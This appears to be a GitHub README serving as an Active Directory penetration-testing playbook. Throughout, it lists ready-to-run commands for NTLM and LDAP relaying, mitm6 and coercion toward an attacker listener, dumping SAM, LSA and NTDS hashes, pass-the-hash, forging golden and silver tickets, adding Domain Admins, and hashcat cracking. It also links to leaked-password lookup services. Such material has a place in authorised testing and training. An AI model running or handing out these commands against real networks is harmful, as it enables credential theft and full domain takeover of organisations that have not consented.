[https://github.com/NotMedic/NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

https://www.n00py.io/2022/10/practical-attacks-against-ntlmv1/

https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/rdp-mitm

https://www.thehacker.recipes/ad/movement/dacl/addmember

https://www.blackhillsinfosec.com/mitm6-strikes-again-the-dark-side-of-ipv6/

https://github.com/Hackndo/pyGPOAbuse

# Gunnajs-Playbook
How to pentest like a Gunnaj

![alt text](https://github.com/GunzyPunzy/Gunnajs-Playbook/blob/main/anfader-adc.jpg)

# Toolbox
<details>
  <summary> Utils </summary> 

  ### NMAP
  https://nmap.org/
  
  ### linWinPwn - Active Directory Vulnerability Scanner
  https://github.com/lefayjey/linWinPwn
  
  <details>
    <summary> Installation </summary>  
  
  #### Install the dependency NetExec
    
  ```shell
  apt install pipx git
  pipx ensurepath
  pipx install git+https://github.com/Pennyw0rth/NetExec
  ```
    
  #### Git clone the repository and make the script executable
  ```shell
  git clone https://github.com/lefayjey/linWinPwn
  cd linWinPwn; chmod +x linWinPwn.sh
  ```
  #### Install requirements using the `install.sh` script (using standard account)
  ```shell
  chmod +x install.sh
  ./install.sh
  ```
  </details>
  
  ### BloodHound
  https://github.com/BloodHoundAD/BloodHound
  
  <details>
    <summary> Installation </summary> 
    
  ```shell
  sudo apt install -y docker.io docker-compose
  wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
  tar -xvzf bloodhound-cli-linux-amd64.tar.gz
  sudo ./bloodhound-cli install
  ```

  #### Navigate to http://localhost:8080/ui/login
  
  </details>
  
  ### Responder
  https://github.com/lgandx/Responder
  
  ### NetExec
  https://www.netexec.wiki/
  
  <details>
    <summary> Installation </summary> 
  
  #### Installation
  ```shell
  apt install netexec
  ```
  #### Integrate Bloodhound
  ```shell
  nano ~/.nxc/nxc.conf
  ```
  ```shell
  [BloodHound]
  bh_enabled = True
  bh_uri = 127.0.0.1
  bh_port = 7687
  bh_user = <username>
  bh_pass = <password>
  ```
  
  </details>

  ### BloodyAD
  https://github.com/CravateRouge/bloodyAD
  
  <details>
    <summary> Installation </summary> 
    
  ```shell
  sudo apt-get install bloodyad
  ```
  
  </details>

  ### go-secdump
  https://github.com/jfjallid/go-secdump
  <details>
    <summary> Installation </summary>

  ```shell
  sudo apt install golang-go
  git clone https://github.com/jfjallid/go-secdump
  cd go-secdump/
  go run main.go
  go build
  ```
  </details>

  ### blindsight
  https://github.com/0xdea/blindsight
  <details>
    <summary> Installation </summary>

  ```shell
  =)
  ```
  </details>

  ### mitm6
  https://github.com/dirkjanm/mitm6
  <details>
    <summary> Installation </summary>

  ```shell
  sudo apt install mitm6
  ```
  </details>
  
  ### Evil-WinRM
  https://github.com/Hackplayers/evil-winrm
  
  <details>
    <summary> Installation </summary>
    
  ```shell
  gem install evil-winrm
  ```
  </details>
  
  ### FindUncommonShares
  https://github.com/p0dalirius/FindUncommonShares
  
  <details>
    <summary> Installation </summary> 
    
  ```shell
  git clone https://github.com/p0dalirius/FindUncommonShares
  cd FindUncommonShares/
  pip install -r requirements.txt
  ```
  </details>
  
  ### Impacket
  https://github.com/fortra/impacket
  
  ### pypykatz
  https://github.com/skelsec/pypykatz
  <details>
    <summary> Installation </summary> 
  
  #### Install prerequirements
  ```shell
  pip3 install minidump minikerberos aiowinreg msldap winacl
  ```
  #### Clone this repo
  ```shell
  git clone https://github.com/skelsec/pypykatz.git
  cd pypykatz
  ```
  #### Install it
  ```shell
  python3 setup.py install
  ```
  </details>

  ### certipty
  https://github.com/ly4k/Certipy
 
  ### breach-parse
  https://github.com/hmaverickadams/breach-parse
  
  ### PRET
  https://github.com/RUB-NDS/PRET
  <details>
    <summary> Installation </summary> 
    
  ```shell
  git clone https://github.com/RUB-NDS/PRET && cd PRET
  ```
  ```shell
  python -m pip install colorama pysnmP
  ```
  </details>

</details>

# Wordlists
<details>
  <summary> Lists </summary> 
  
  ### Generate wordlist
  https://zzzteph.github.io/weakpass/
  
  ### Top 10 million
  https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt (8.1 MB)
  
  ### Crackstation
  https://crackstation.net/files/crackstation.txt.gz (14.6 GB)
  
  ### Large p-list
  https://download.g0tmi1k.com/wordlists/large/36.4GB-18_in_1.lst.7z (48.4 GB)
  
  ### Rockyou2021
  https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
</details>

# Leaked password
<details>
  <summary> Sites </summary>   

  ### breachdirectory (free)
  https://breachdirectory.org/

  ### Records Search (free)
  https://search.0t.rocks/

  ### DeHashed
  https://www.dehashed.com/

  ### Snusbase
  https://snusbase.com/

  ### breach-parse
  https://github.com/hmaverickadams/breach-parse
</details>

# Network enumeration
<details>
  <summary> NMAP </summary> 
  
  ### Nmap
  #### Ping scan
  ```shell
  sudo nmap -sP -p -oN <output.txt> <IP/mask>
  ```

  #### Full scan
  ```shell
  sudo nmap -PN -sC -sV -p- -oN <output.txt> <IP/mask>
  ```

  #### smb vuln scan
  ```shell
  sudo nmap -PN --script smb-vuln* -p139,445 -oN <output.txt> <IP/mask>
  ```

  ### Find DC IP
  #### Show domain name and DNS
  ```shell
  sudo mncli dev show eth0
  ```

  #### Show DC IP
  ```shell
  nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
  ```

  #### Show DC controllers in cmd
  ```shell
  nltest /dclist:<domainname>
  ```
</details>

<details>
  <summary> NetExec host enumeration </summary> 
  
  #### NetExec map network hosts 
  ```shell
  NetExec smb <subnet>
  ```
  
</details>

# Authentication
    
<details>
  <summary> NetExec domain authentication </summary> 

  #### Password
  ```shell
  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password>
  ```

  #### Pass-the-Hash
  ```shell
  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -H <hash[LM:NT]> 
  ```

  #### Kerberos
  ```shell
  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -k -p <AD_password>
  ```

  #### Using kcache

  ```shell
  export KRB5CCNAME=<Kerberos_ticket>
  ```

  ```shell
  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> --use-kcache
  ```

  #### Pass-the-Certificate
  ```shell
  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> ---pfx-cert <user.pfx>
  ```

</details> 
  
<details>
  <summary> NetExec local authentication </summary> 
  
  ```shell
  NetExec smb <target_IP> -u <AD_user> -H <hash[LM:NT]> --local-auth 
  ```

</details> 

<details>
  <summary> NetExec password spray </summary> 
  
  ### Spray a password on a user list
  ```shell
  NetExec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
  ```

</details> 

# Acitve directory enumeration

<details>
  <summary> LDAPDomainDump </summary> 

#### Collect domain info
```shell
ldapdomaindump -u <Domain>\\<AD_user> -p <AD_password> <Domain_Controller_IP>
```

</details>

<details>
  <summary> NetExec active users </summary> 

#### Get what users are enabled
```shell
NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <AD_password> --active-users
```

</details>

<details>
  <summary> NetExec password policy </summary> 

#### Get the password policy of the domain
```shell
NetExec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> --pass-pol
```

</details>

<details>
  <summary> NetExec BloodHound dump all info </summary> 

#### Dump 
```shell
NetExec ldap <Domain_Controller_IP> -d <Domain> -u <AD_user> -p <AD_password> --bloodhound --collection All
```

</details>

<details>
  <summary> BloodHound mark all relevant groups as highvalue </summary> 

#### Query
```shell
MATCH (x:Group)
WHERE x.highvalue=true
MATCH p=shortestPath((n:Group)-[r*1..]->(x)) 
WHERE x <> n
AND NONE (r in relationships(p) WHERE type(r) = "CanRDP")
SET n.highvalue = true
RETURN http://n.name, n.highvalue
```

</details>

<details>
  <summary> NetExec enumerate null sessions </summary> 

#### Check if Null Session is enabled
```shell
NetExec smb <Domain_Controller_IP> -u '' -p ''
NetExec smb <Domain_Controller_IP> -u '' -p '' --shares
NetExec smb <Domain_Controller_IP> -u '' -p '' --pass-pol
NetExec smb <Domain_Controller_IP> -u '' -p '' --users
NetExec smb <Domain_Controller_IP> -u '' -p '' --groups
```

</details>

<details>
  <summary> NetExec enumerate guest logon </summary> 

#### Check if domain guest account or the local guest account is enabled
```shell
NetExec smb <Domain_Controller_IP> -u 'a' -p ''
NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
```

</details>

<details>
  <summary> NetExec enumerate logged on users </summary> 

####  Domain account
```shell
NetExec smb <target_IP> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> --reg-sessions
```

####  Domain account with local admin rights 
```shell
NetExec smb <target_IP> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> --loggedon-users
```

####  Local account with local admin rights 
```shell
NetExec smb <target_IP> -u <local_user> -H <hash[LM:NT]> --local-auth --loggedon-users
```

</details>

<details>
  <summary> linWinPwn </summary> 
  
  ### Unauthenticated
  - Module ad_enum
      - RID bruteforce using netexec
      - Anonymous enumeration using netexec, enum4linux-ng, ldapdomaindump, ldeep
      - Pre2k authentication check on collected list of computers
  - Module kerberos
      - kerbrute user spray
      - ASREPRoast using collected list of users (and cracking hashes using john-the-ripper and the rockyou wordlist)
      - Blind Kerberoast
      - CVE-2022-33679 exploit
  - Module scan_shares
      - SMB shares anonymous enumeration on identified servers
  - Module vuln_checks
      - Enumeration for WebDav, dfscoerce, shadowcoerce and Spooler services on identified servers
      - Check for ms17-010, zerologon, petitpotam, nopac, smb-sigining, ntlmv1, runasppl weaknesses
  ```shell
   sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -M user <output_dir>
  ```

  ### With AD-user credentials 
  - DNS extraction using adidnsdump
  - Module ad_enum
      - BloodHound data collection
      - Enumeration using netexec, enum4linux-ng, ldapdomaindump, windapsearch, SilentHound, ldeep
          - Users
          - MachineAccountQuota
          - Password Policy
          - Users' descriptions containing "pass"
          - ADCS
          - Subnets
          - GPP Passwords
          - Check if ldap-signing is enforced, check for LDAP Relay
          - Delegation information
      - netexec find accounts with user=pass 
      - Pre2k authentication check on domain computers
      - Extract ADCS information using certipy and certi.py

  - Module kerberos
      - kerbrute find accounts with user=pas
      - ASREPRoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)
      - Kerberoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)
      - Targeted Kerberoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)
  - Module scan_shares
      - SMB shares enumeration on all domain servers using smbmap and cme's spider_plus
      - KeePass files and processes discovery on all domain servers
  - Module vuln_checks
      - Enumeration for WebDav, dfscoerce, shadowcoerce and Spooler services on all domain servers
      - Check for ms17-010, ms14-068, zerologon, petitpotam, nopac, smb-signing, ntlmv1, runasppl weaknesses
  - Module mssql_enum
      - Check mssql privilege escalation paths
  ```shell
  sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -u <AD_user> -p <AD_password> -o <output_dir>
  ```
</details>

# Share enumeration

<details>
  <summary> List readable or writable shares </summary> 

```shell
NetExec smb <target_IP> -u AD_user -p <password>  --shares READ,WRITE
```

</details>

<details>
  <summary> List uncommon shares and export as xlsx </summary> 

```shell
python3 ./FindUncommonShares.py -au AD_user -ap <password> -ad <AD_domain> -ai <Domain_Controller_IP> --readable --export-xlsx shares
```

</details> 

<details>
  <summary> Impacket smbclient </summary> 
  
### Passord authentication
```shell
impacket-smbclient <AD_domain>/<username>:<password>@<target_IP>
```

### Pass-the-Hash
```shell
impacket-smbclient -hashes <hash[LM:NT]> <username>:@<target_IP>
```

</details> 

<details>
  <summary> Mount and unmount shares </summary> 

### Mount share
```shell
sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<AD_domain>
```

### Unmount share
```shell
sudo umount <./folder>
```

### Search for keywords in files
```shell
grep -i <keyword> *
```

</details> 

# Computer accounts 

<details>
  <summary> NetExec MachineAccountQuota </summary> 

#### Retrieve the MachineAccountQuota 
```shell
NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <AD_password> -M maq
```

</details>

<details>
  <summary> impacket-addcomputer </summary> 

#### Create a computer account
```shell
impacket-addcomputer -dc-ip <Domain_Controller_IP> -computer-name <Computer_Name> -computer-pass '<computer_password>' '<AD_domain>/<AD_user>:<AD_password>'
```

</details>

<details>
  <summary> Pre-Windows 2000 computers </summary> 

#### NetExec pre2k - obtain tickets
```shell
NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <AD_password> -M pre2k
```

</details>

# MITM and Relaying
<details>
  <summary> Responder </summary> 
  
  ### Kickstart responder
  ```shell
  sudo responder -I eth0
  ```

  Switches for Responder
  * -d = DHCP 
  * -D = DHCP-DNS
  * -w = WPAD
  * -F = Force WPAD atuh
  * --lm = Force ntlmv1
  * --disable-ess = No ESS (Extended Session Security
  
 </details>
 <details>
  <summary> NetExec lnkfile with slinky </summary> 
  
  ### Creates a lnk file for a share with read/write rights
  ```shell
  netexec smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP>
  ```
   
  ### Remove the lnk file
  ```shell
  netexec smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP> CLEANUP=True
  ```
    
</details>
<details>
  <summary> NTLM-relay </summary>   

  ### Evaluate no smb-signing and create an IP txt file for NTLMRelayx
  ```shell
  netexec smb <IPs> --gen-relay-list <nosmbsigning.txt>
  ```

  ### NTLMRelayx
  ```shell
  sudo impacket-ntlmrelayx -of <outfile.txt> -tf <nosmbsigning.txt> -smb2support
  ```

  ### go-secdump NTLM Relaying
  ```shell
  ./go-secdump --host <target> -n --relay
  ```

  ### Disbale SMB and HTTP in Responder.conf
  ```shell
  [Responder Core]

  ; Servers to start
  SQL = On
  SMB = Off
  RDP = On
  Kerberos = On
  FTP = On
  POP = On
  SMTP = On
  IMAP = On
  HTTP = Off
  HTTPS = On
  DNS = On
  LDAP = On
  DCERPC = On
  WINRM = On
  SNMP = Off
  ```

### Kicksart responder then
  ```shell
  sudo responder -I eth0 
  ```
</details>

<details>
  <summary> NTLMv1-relay </summary>   

  ### NTLMRelayx delegate access if NTLMv1 is enabled
  #### Authentication can be forced via NetExec's coerce_plus Module, check if the answer is in NTLMv1
  ```shell
  sudo python3 ntlmrelayx.py -t ldaps://<target> --remove-mic -smb2support --delegate-access
  ```

</details>

<details>
  <summary> LDAP-relay </summary>   

  ### Evaluate no ldap-signing and create an IP txt file for NTLMRelayx
  ```shell
  NetExec ldap <IPs> -d <Domain_Name> -u <AD_user> -p <AD_password> -M ldap-checker
  ```

  ### NTLMRelayx escalate user to Enterprise Admins (DCSync rights)
  ```shell
  sudo impacket-ntlmrelayx -t ldaps://<Domain_Controller_IP> --escalate-user <AD_user>
  ```

  ### NTLMRelayx delegate access
  ```shell
  sudo impacket-ntlmrelayx -t ldaps://<Domain_Controller_IP> --delegate-access
  ```

  ### Disbale SMB and HTTP in Responder.conf
  ```shell
  [Responder Core]

  ; Servers to start
  SQL = On
  SMB = Off
  RDP = On
  Kerberos = On
  FTP = On
  POP = On
  SMTP = On
  IMAP = On
  HTTP = Off
  HTTPS = On
  DNS = On
  LDAP = On
  DCERPC = On
  WINRM = On
  SNMP = Off
  ```

### Kicksart responder then
  ```shell
  sudo responder -I eth0 
  ```
</details>

<details>
  <summary> mitm6-relay </summary>   

  ### mitm6
  ```shell
  sudo mitm6 -d <Domain_Name>
  ```

  ### NTLMRelayx 
  ```shell
  impacket-ntlmrelayx -6 -t ldaps://<Domain_Controller_IP> -wh fakewpad.<Domain_Name> -l loot 
  ```

</details>

<details>
  <summary> Kerberos-relay </summary>   

  ### In the works
  ```shell
  ---
  ```

</details>

<details>
  <summary> NetExec coerce_plus </summary> 
  
  ### NetExec Coerce Authentication
  ```shell
  NetExec smb <target> -u <AD_user> -p <AD_password> -M coerce_plus -o LISTENER=<AttackerIP> METHOD=<method>
  ```
  ### Methods
  * Petitpotam
  * DFSCoerce
  * ShadowCoerce
  * Printerbug
  * MSEven

</details> 

# Delegation abuse

<details>
  <summary> BloodHound query for Delegation rights </summary> 
  
  ```shell
  MATCH q=(u)-[:GenericWrite|GenericAll|WriteDacl|
WriteOwner|Owns|WriteAccountRestrictions|AllowedToAct|AllowedToDelegate]->(:Computer) WHERE NOT
u.objectid ENDS WITH "-512" AND NOT
u.objectid ENDS WITH "-519" AND NOT
u.objectid ENDS WITH "-544" AND NOT
u.objectid ENDS WITH "-548" RETURN q
  ```
</details> 

<details>
  <summary> Netexec misconfigured delegation </summary> 
  
  ```shell
  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> --find-delegation
  ```
</details> 

<details>
  <summary> Netexec trusted for delegation </summary> 

  ```shell
  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> --trusted-for-delegation
  ```
    
</details> 
    
# AD Certificates

<details>
  <summary> NetExec list all PKI enrollment servers </summary> 
  
  ```shell
  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> -M adcs
  ```
</details> 

<details>
  <summary> Certipy find vulnerable certificates </summary> 
  
  ```shell
  certipy find -u <AD_user> -p <password> -dc-ip <Domain_Controller_IP> -vulnerable -stdout -enabled -text -json
  ```
</details> 

<details>
  <summary> ESC1 </summary> 

  ```shell
  certipy req -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server> -template <vulnerable_template> -upn AD_user@<domain> -sid <user_SID>
  ```
</details> 

<details>
  <summary> ESC4 </summary> 

  ```shell
  certipy template -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -target <target_server> -template <vulnerable_template> -write-default-configuration
  ```
</details> 

<details>
  <summary> ESC8 </summary> 
  
  ### http
  ```shell
  certipy relay -target <target_server> -ca <Certificate_authorities> -template <vulnerable_template>
  ```

  ### https
  ```shell
  ntlmrelayx.py -t https://<target_server>/certsrv/certfnsh.asp -smb2 --adcs --template <vulnerable_template>
  ```
  #### --template 'Domain Controller' can be most times be used

  ### NetExec Coerce Authentication
  ```shell
  NetExec smb <target> -u <AD_user> -p <AD_password> -M coerce_plus -o LISTENER=<AttackerIP> METHOD=<method>
  ```
  ### Methods
  * Petitpotam
  * DFSCoerce
  * ShadowCoerce
  * Printerbug
  * MSEven
    
</details> 

# Kerberoasting & ASREPRoast
<details>
  <summary> Kerberoasting </summary> 

  ```shell
  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> --kerberoasting <output>.txt
  ```
  </details> 

  <details>
  <summary> ASREPRoast </summary> 

  ```shell
  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p '' --asreproast <output>.txt
  ```

</details> 

# Credential dumping

<details>
  <summary> Domain authentication </summary> 

  ### Dump NT:hash with masky with domain user
  ### Get ADCS server name
  ```shell
  NetExec ldap <target_IP> -u <AD_user> -p <password> -H <hash[LM:NT]]> -M adcs
  ```

  ### Retrieve the NT hash using PKINIT
  ```shell
  NetExec ldap <target_IP> -u <AD_user> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
  ```
  
  ### NetExec Dump SAM with domain user
  ```shell
  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash[LM:NT]]> --sam
  ```

  ### go-secdump Dump SAM with domain user
  ```shell
  ./go-secdump --domain <Domain_Controller_IP> --host <target_IP> --user <AD_user> ---pass <password> --hash <hash[LM:NT]]> --sam
  ```
  
  ### NetExec Dump LSA with domain user
  ```shell
  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> --lsa
  ```
  ### go-secdump Dump LSA with domain user
  ```shell
  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <AD_user> ---pass <password> --hash <hash[LM:NT]]> --lsa
  ```

</details> 

<details>
  <summary> Local authentication </summary> 
  
  ### NetExec Dump SAM on local computer
  ```shell
  NetExec smb <target_IP> -u <local_user> -p <password> -H <hash[LM:NT]> --local-auth --sam
  ```

  ### sec-dump Dump SAM on local computer
  ```shell
  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <local_user> ---pass <password> --hash <hash[LM:NT]]> --sam --local
  ```
  
  ### NetExec Dump LSA on local computer
  ```shell
  NetExec smb <target_IP> -u <local_user> -p <password> -H <hash[LM:NT]> --local-auth --lsa
  ```

  ### go-secdump Dump LSA on local computer
  ```shell
  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <local_user> ---pass <password> --hash <hash[LM:NT]]> --lsa --local
  ```

  ### NetExec Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth -M hash_spider
  ```

  ### Stored User Names and Passwords on Windows Credential Manager
  ```shell
  rundll32.exe keymgr.dll KRShowKeyMgr
  ```
  
</details> 

<details>
  <summary> NetExec dump with ReadLAPSPassword rights </summary> 

  ### Check if the user can read LAPS
  ```shell
  NetExec ldap <AD_domain> -u <username> -p <password> -H <hash[LM:NT]> -M laps
  ```
  
  ### Dump SAM 
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M laps --sam
  ```
  
  ### Dump LSA 
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --M laps --lsa
  ```
  
</details> 

<details>
  <summary> Run blindsigt from impackets smb share </summary> 

  ### Starting a SMB Server
  ```shell
  impacket-smbserver.py <shareName> <sharePath>
  ```
  
  ### Run blindsight from host 
  ```shell
  \\<target_IP>\<shareName>\blindsight.exe
  ```

  ### Retrieve the file
  ```shell
  lget <output>.log
  ```

  ### Unscramble memory dump:
  ```shell
  blindsight.exe <output>.log
  ```
  
</details> 

<details>
  <summary> Examine lsass dump with pypykatz </summary> 

```shell
pypykatz lsa minidump lsass.DMP
```
</details> 

<details>
  <summary> NetExec Dump the NTDS.dit from target DC (DCSync) </summary> 

#### Dump all user hashes
```shell
NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> --ntds
```

#### Dump a specific user hash
```shell
NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> --ntds --user <AD_user>
```
</details> 

# Remote Code Execution

<details>
  <summary> NetExec </summary> 
  
  ### Executes command via the follwoing protocols: 
  * `wmiexec` executes commands via WMI
  * `atexec` executes commands by scheduling a task with windows task scheduler
  * `smbexec` executes commands by creating and running a service
  
  #### command
  ```shell
  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -x <command>
  ```
  #### PowerShell
  ```shell
  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -X <command>
  ```
  #### Task Scheduler
  ```shell
  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
  ```
</details> 

<details>
  <summary> Evil-WinRM </summary> 
  
  ```shell
  evil-winrm -i <target_IP> -u <username> -p <password> -H <hash[LM:NT]>
  ```
</details> 

<details>
  <summary> pth-rpcclient </summary> 

  ```shell
  pth-rpcclient -U <AD_domain>/<username>%<hash[LM:NT]> <Domain_Controller_IP>
  ```
</details> 

<details>
  <summary> pth-net add new domain admin </summary> 

  ```shell
  pth-net rpc group addmem "Domain Admins" <username> -U <AD_domain>/<username>%<hash[LM:NT]> -S <Domain_Controller_IP>
  ```
</details> 

<details>
  <summary> Command to add a new Domain Admin </summary> 
  
  #### Create the new user
  ```Shell
  net user <username> <password> /add /domain
  ```

  #### Add the new user to the Domain Admins group
  ```Shell
  net group "Domain Admins" <username> /add /domain
  ```

  #### Add user to Domain Admins by creating a scheduled task
  ```Shell
  schtasks /create /tn "AddDomainAdmin" /tr "net group \"domain admins\" <AD_User> /add /domain" /sc once /st 08:30 /ru "<Domain_Name\<Privilged_AD_User>"
  ```

  #### Running the scheduled task
  ```Shell
  schtasks /run /tn "AddDomainAdmin"
  ```

  #### Add an user to the domain admin
  ```ps
  powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
  ```
</details> 

# AV Evasion

<details>
  <summary> NetExec </summary> 
  
  </details> 

</details> 
  
# golden and silver tickets

<details>
  <summary> Silver tickets </summary> 

| Service Type                               | Service Silver Tickets   |
|--------------------------------------------|--------------------------|
| WMI                                        | HOST, RPCSS              |
| PowerShell Remoting                        | HOST, HTTP, WSMAN, RPCSS |
| WinRM                                      | HOST, HTTP               |
| Scheduled Tasks                            | HOST                     |
| Windows File Share (CIFS)                  | CIFS                     |
| LDAP operations including Mimikatz DCSync  | LDAP                     |
| Windows Remote Server Administration Tools | RPCSS, LDAP, CIFS        |


</details>

<details>
  <summary> Tickets </summary> 
  
#### Get user SID value by using the Windows Terminal
```cmd
wmic useraccount where name="USER" get sid
```

#### Silver ticket
```shell
python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain>l <user>
```
#### Golden ticket
```shell
python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> <user>
```
#### Set the ticket for impacket use
```shell
export KRB5CCNAME=<TGS_ccache_file>
```

#### List tickets
```shell
klist
```

#### Execute remote commands with any of the following by using the TGT
```shell
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

</details>

# Printers
<details>
  <summary> PRET </summary> 

  ### Nmap printers
  ```shell
  nmap -p 9100 <IP/mask>
  ```
  ### cheat sheet
  ```shell
  http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
  ```
  ### Kickstart PRET 
  ```shell
  pret.py target {ps,pjl,pcl}
  ```
</details>

# Hash cracking
<details>
  <summary> Attack modes </summary> 

  ### Dictionary attack (-a 0)
  #### Tries all words in a list
  ```shell
  hashcat64.exe -m <hash_type> -a 0 <hashes.txt> <passlist.txt> -o cracked.txt
  ```

  ### Combinator attack (-a 1)
  #### Combines words from multiple wordlists
  ```shell
  hashcat64.exe -m <hash_type> -a 1 <hashes.txt> <passlist1.txt> <passlist2.txt> -o cracked.txt
  ```

  ### Brute force (-a 3)
  #### Tries all characters from given charsets
  ```shell
  hashcat64.exe -m <hash_type> -a 3 <hashes.txt> ?a?a?a?a?a?a?a?a --increment -o cracked.txt
  ```

  ### Hybrid (-a 6)
  #### Combines wordlists+masks
  ```shell
  hashcat64.exe -m <hash_type> -a 6 <hashes.txt> <passlist.txt> ?a?a?a?a?a?a?a?a --increment -o cracked.txt
  ```

  ### Hybrid (-a 7)
  #### Combines masks+wordlists
  ```shell
  hashcat64.exe -m <hash_type> -a 7 <hashes.txt> ?a?a?a?a?a?a?a?a <passlist.txt> --increment -o cracked.txt
  ```

 #### Built-in charsets
 * ?l = abcdefghijklmnopqrstuvwxyz
 * ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
 * ?d = 0123456789
 * ?h = 0123456789abcdef
 * ?H = 0123456789ABCDEF
 * ?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
 * ?a = ?l?u?d?s
 * ?b = 0x00 - 0xff
 
 #### Password length increment
* --increment-min <number>
* --increment-max <number>
</details>

<details>
  <summary> Hash types </summary> 

  ### LM

  ```shell
  hashcat64.exe -m 3000 -a 3 <LM-hashes.txt> -o cracked.txt
  ```

  ### NTLM
  ```shell
  hashcat64.exe -m 1000 -a 3 <NTLM-hashes.txt> -o cracked.txt
  ```
  dcsync
  ```shell
  hashcat64.exe -m 1000 -a 3 --username <NTLM-hashes.txt> -o cracked.txt
  ```

  ### NTLMv1
  ```shell
  hashcat64.exe -m 5500 -a 3 <NTLMv1-hashes.txt> -o cracked.txt
  ```

  ### NTLMv2
  ```shell
  hashcat64.exe -m 5600 -a 0 <NTLMv2-hashes.txt> <passlist.txt> -o cracked.txt
  ```

  ### Kerberos ASREP
  ```shell
  hashcat64.exe -m 18200 -a 0 <asrep-hashes.txt> <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 TGS
  ```shell
  hashcat64.exe -m 13100 -a 0 <krb5tgs-hashes.txt> <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 TGS AES128
  ```shell
  hashcat64.exe -m 19600 -a 0 <krb5tgsaes128-hashes.txt> <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 TGS AES256
  ```shell
  hashcat64.exe -m 19700  -a 0 <krb5tgsaes256.txt> <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 etype 17, Pre-Auth
  ```shell
  hashcat64.exe -m 19800  -a 0 <krb5tetype17.txt> <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 etype 18, Pre-Auth
  ```shell
  hashcat64.exe -m 19900  -a 0 <krb5tetype18.txt> <passlist.txt> -o cracked.txt
  ```

  ### MsCache 2 (slow af)
  ```shell
  hashcat64.exe -m 2100 -a 0 <mscache2-hashes.txt> <passlist.txt> -o cracked.txt
  ```
  </details>
